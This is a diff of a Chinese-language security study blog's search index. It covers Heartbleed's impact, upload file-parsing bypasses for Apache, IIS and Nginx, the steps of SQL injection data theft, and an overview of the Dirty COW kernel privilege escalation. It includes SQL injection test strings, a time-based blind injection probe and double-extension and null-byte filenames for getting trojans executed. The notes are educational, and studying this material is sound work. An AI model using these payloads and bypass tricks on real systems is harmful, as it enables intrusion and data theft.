+<p>参考：<a href="https://cloud.tencent.com/developer/article/1425920" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1425920</a></p>
+<h2 id="二、心脏滴血漏洞产生的原因有哪些"><a href="#二、心脏滴血漏洞产生的原因有哪些" class="headerlink" title="二、心脏滴血漏洞产生的原因有哪些"></a>二、心脏滴血漏洞产生的原因有哪些</h2><p>可以随机泄露内存中的64k数据，而且可通过重复读取获得更多内存数据，openssl又是存储用户请求中的明文数据，其中包括源码，登录时用的明文账号密码，登录后服务器返回的合法认证因素，软件序列后，机密文件，甚至是可以突破一些系统保护机制的关键数据。还可能暴露其他用户的敏感请求和响应，包括用户任何形式的POST请求，会话cookie和密码，这使攻击者可以劫持其他用户的服务身份。</p>
+<p>链接：<a href="https://www.nowcoder.com/questionTerminal/7b1f9fd52d184318a53f5a1f374734ed" target="_blank" rel="noopener">https://www.nowcoder.com/questionTerminal/7b1f9fd52d184318a53f5a1f374734ed</a><br>来源：牛客网</p>
+<h2 id="三、Apache，IIS，Nginx的文件解析漏洞都是如何解析和利用的？"><a href="#三、Apache，IIS，Nginx的文件解析漏洞都是如何解析和利用的？" class="headerlink" title="三、Apache，IIS，Nginx的文件解析漏洞都是如何解析和利用的？"></a>三、Apache，IIS，Nginx的文件解析漏洞都是如何解析和利用的？</h2><p>Apache 解析漏洞</p>
+<p> 对URL从右往左逐层判断解析，不可解析就一直往左解析判断，直到能正确解析出文件</p>
+<p> 上传木马文件时，将合法后缀放在URL最右，绕过本地文件上传限制和服务器的类比黑名单验证<br> ，Apache服务器就会逐层从右往左解析，如xx.php.jpg.rar的一个木马文件最后会到php成功解析，那么<br> 木马也就成功执行了。</p>
+<p> IIS解析漏洞</p>
+<p> 一种是IIS5.x/6.0解析漏洞</p>
+<p> 在网站下建立文件夹啊名称中带有.asp,.asa等可执行的脚本文件后缀为后缀的文件夹，其目录内的任何扩展<br> 名的文件都被当作可执行文件来解析</p>
+<p> 另外还有文件解析，IIS6.0下分号后面的不解析，也就是xx.asp;.jpg被当成xx.asp来解析<br> 除了asp还有.asa,.cer,.cdx都可被解析</p>
+<p> 一种是IIS7.0/IIS7.5的畸形漏洞解析</p>
+<p> 在Fast-CGI开启下，会在例如URL为<a href="http://www.xxx.com/xx.jpg/.php中将xx.jpg当成php解析" target="_blank" rel="noopener">http://www.xxx.com/xx.jpg/.php中将xx.jpg当成php解析</a></p>
+<p> Nginx解析漏洞</p>
+<p> 在Nginx0.5，0.6以及0.7 ⇐ 0.7.65，0.8 ⇐ 0.8.37上存在空字节代码执行漏洞</p>
+<p> 也就是在访问如以下<a href="http://www.xxx.com/xx.jpg.php" target="_blank" rel="noopener">http://www.xxx.com/xx.jpg%00.php</a>中会将xx.jpg当作php文件解析<br> 它将.jpg%00看成一段字符</p>
+<p> 在CVE-2013-4547 Nginx下<br> 还存在着将如下URL <a href="http://www.xx.com/a.jpg" target="_blank" rel="noopener">http://www.xx.com/a.jpg%00</a>\0.php中的a.jpg当作php执行漏洞</p>
+<h2 id="四、简述一下利用sql注入漏洞拖取数据的过程"><a href="#四、简述一下利用sql注入漏洞拖取数据的过程" class="headerlink" title="四、简述一下利用sql注入漏洞拖取数据的过程"></a>四、简述一下利用sql注入漏洞拖取数据的过程</h2><ul>
+<li>1、收集应用程序的可测试点</li>
+<li>2、确定可测试点是否是可注入点</li>
+<li>3、数据库类型探测</li>
+<li>4、数据库基本信息探测，包括当前数据库用户名、当前用户名权限、数据库表信息（几个表、几个列、表名称、列名称）</li>
+<li>5、利用漏洞爆取数据（明注入、盲注入）</li>
+</ul>
+<p>1、2、判断可测试的点：主要集中在提交，用户可控的参数上面。比如说在post和get请求上面的参数。如果对http头也有参数校验判断的点，可能也会产生注漏。</p>
+<h3 id="1、注入参数的类型"><a href="#1、注入参数的类型" class="headerlink" title="1、注入参数的类型"></a>1、注入参数的类型</h3><p>有<strong>字符型</strong>、<strong>数字型</strong>、<strong>搜索型</strong></p>
+<p>字符型：单双引号测试<br>数字型：不需要添加定界符，数值也可以不带引号（mysql数字参数存在强制类型转换<code>1asd</code>等于<code>1</code>）<br>搜索型：’and 1=1 and ‘%’=’        变成了where username like ‘%$name’and <strong>1</strong>=<strong>1</strong> and ‘%’=’%’（‘and ‘%’ =‘也可。但是1=1和1=2可以加入判断根据回显报错。）</p>
+<h3 id="2、-判断注入的原则"><a href="#2、-判断注入的原则" class="headerlink" title="2、 判断注入的原则"></a>2、 判断注入的原则</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、单双引号添加在后面返回报错信息。</span><br><span class="line">2、and符号 &#39;and &#39;1&#39;&#x3D;&#39;1 正常页面 &#39;and &#39;1&#39; &#x3D; &#39;2 非正常页面</span><br><span class="line">3、or符号 与上面的一样 永真。</span><br><span class="line">4、加减运算符。 数字型 id&#x3D;4 id&#x3D;3+1 </span><br><span class="line">5、字符型单引号允许字符串拼接 uname&#x3D;ad&#39;&#39;min&amp;passwd&#x3D;ad&#39;&#39;min 正常页面。</span><br><span class="line">6、添加注释符</span><br><span class="line">7、有些参数可能在括号里面的如：SELECT first_name, last_name FROM users WHERE user_id &#x3D; （&#39;$id&#39;）；所以也可以在参数后面加单、双引号和括号，如id&#x3D;1&#39;) --+ 或 id&#x3D;1&quot;) --+ 或id&#x3D;1&#39;) # 或id&#x3D;1&quot;) --+</span><br><span class="line">8、1&#39; and sleep(5)考虑时间盲注 and if (ascii(substring(databaes(),1,1)&#x3D;116),sleep(5),1。延时函数benchmark 笛卡尔积做时间盲注</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、-数据库类型探测"><a href="#3、-数据库类型探测" class="headerlink" title="3、 数据库类型探测"></a>3、 数据库类型探测</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WAITFOR DELAY &#39;0:0:4&#39;   &#x2F;&#x2F;mssql 延时四秒</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<p><a href="https://zhuanlan.zhihu.com/p/96616856" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/96616856</a></p>
+<p><a href="https://www.jianshu.com/p/50a48ac63cc5" target="_blank" rel="noopener">https://www.jianshu.com/p/50a48ac63cc5</a></p>
+<p><a href="https://www.jianshu.com/p/e28cc1f66f45" target="_blank" rel="noopener">https://www.jianshu.com/p/e28cc1f66f45</a></p>
+<p><a href="https://www.cnblogs.com/SCHAOGES/p/10889654.html" target="_blank" rel="noopener">https://www.cnblogs.com/SCHAOGES/p/10889654.html</a></p>
+<p><a href="https://ruanx.net/sql-time-injection/" target="_blank" rel="noopener">https://ruanx.net/sql-time-injection/</a> （时间盲注笔记）</p>
+<p><a href="https://wsygoogol.github.io/2016/06/18/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%86%E5%88%AB/（数据库类型识别）" target="_blank" rel="noopener">https://wsygoogol.github.io/2016/06/18/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%86%E5%88%AB/（数据库类型识别）</a></p>
+<p><a href="https://www.bugfor.com/web/5167.html（数据库类型探测）" target="_blank" rel="noopener">https://www.bugfor.com/web/5167.html（数据库类型探测）</a></p>
+<h2 id="五、-如何判断服务器脚本语言"><a href="#五、-如何判断服务器脚本语言" class="headerlink" title="五、 如何判断服务器脚本语言"></a>五、 如何判断服务器脚本语言</h2><p><a href="https://segmentfault.com/q/1010000000362808" target="_blank" rel="noopener">https://segmentfault.com/q/1010000000362808</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>提权/脏牛Linux本地提权/脏牛Linux本地提权</title>
+    <url>/2020/12/24/%E6%8F%90%E6%9D%83/%E8%84%8F%E7%89%9BLinux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/%E8%84%8F%E7%89%9BLinux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​    汇总提权的开篇，从CVE-2016-5195开始</p>
+<h2 id="0x02-脏牛简介"><a href="#0x02-脏牛简介" class="headerlink" title="0x02 脏牛简介"></a>0x02 脏牛简介</h2><p>漏洞编号：CVE-2016-5195<br>漏洞名称：脏牛（Dirty COW）<br>漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权<br>影响范围：Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。</p>
+<h3 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a><strong>一、漏洞概述</strong></h3><p>Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。</p>
+<p>竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。VDSO就是Virtual Dynamic Shared Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。</p>
+<p>在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。</p>
+<h3 id="二、检查内核版本"><a href="#二、检查内核版本" class="headerlink" title="二、检查内核版本"></a><strong>二、检查内核版本</strong></h3><p>通过uname -a 命令，查看内核版本：</p>
+<p>主流发行版修复之后的内核版本，如果你的内核版本低于列表里的版本，表示还存在脏牛漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Centos7 &#x2F;RHEL7  3.10.0-327.36.3.el7</span><br><span class="line">Cetnos6&#x2F;RHEL6   2.6.32-642.6.2.el6</span><br><span class="line">Ubuntu 16.10     4.8.0-26.28</span><br><span class="line">Ubuntu 16.04     4.4.0-45.66</span><br><span class="line">Ubuntu 14.04     3.13.0-100.147</span><br><span class="line">Debian 8        3.16.36-1+deb8u2</span><br><span class="line">Debian 7        3.2.82-1</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a href="https://www.jianshu.com/p/df72d1ee1e3e" target="_blank" rel="noopener">https://www.jianshu.com/p/df72d1ee1e3e</a></p>
 ]]></content>
   </entry>
 </search>
